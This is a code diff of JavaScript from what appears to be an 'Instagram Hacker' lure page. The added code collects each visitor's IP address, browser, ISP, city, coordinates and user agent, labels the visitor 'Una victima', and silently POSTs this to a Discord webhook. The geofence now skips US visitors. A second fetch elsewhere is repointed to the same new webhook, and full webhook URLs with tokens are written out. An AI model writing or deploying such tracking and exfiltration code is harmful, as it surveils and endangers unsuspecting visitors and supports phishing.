@@ -43,22 +43,26 @@
                     browserName = "Internet Explorer";
                 }
 
+                if (data.country != "US"){
+
+                    console.log(ipPublica);
+
+                                    const entrada = {
+                                                    content:  "\n\n==================================\n" + "Una victima ha accedido a la pagina: \n\n" + "IP: " + ipPublica + "\nNavegador: "+ browserName + "\nProveedor: " + isp + "\nUbicación: " + city + "\nCoordenadas: " + coors + "\nUser-Agent: " + userAgent +  "\n==================================\n",
+                                                    username: "Instagram Hacker",
+                                                    };
+
+                                    const test = await fetch('https://discord.com/api/webhooks/1349094018872774726/s194afUvPM-TTQqIdegLa6lwo5EZ_0m57SOzXStU3cCE9nBSC9eALhsXQiaVyqSBgwLe', {
+                                                method: "POST",
+                                                headers: { "Content-Type": "application/json" },
+                                                body: JSON.stringify(entrada)
+
+                                    });
+
+                }
+
+
                 
-
-
-                console.log(ipPublica);
-
-                const entrada = {
-                                content:  "\n\n==================================\n" + "Una victima ha accedido a la pagina: \n\n" + "IP: " + ipPublica + "\nNavegador: "+ browserName + "\nProveedor: " + isp + "\nUbicación: " + city + "\nCoordenadas: " + coors + "\nUser-Agent: " + userAgent +  "\n==================================\n",
-                                username: "Instagram Hacker",
-                                };
-
-                const test = await fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
-                            method: "POST",
-                            headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(entrada)
-
-                });
                 
 
             
@@ -97,7 +101,7 @@
 
 
 
-                            fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
+                            fetch('https://discord.com/api/webhooks/1349094018872774726/s194afUvPM-TTQqIdegLa6lwo5EZ_0m57SOzXStU3cCE9nBSC9eALhsXQiaVyqSBgwLe', {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify(mensaje)
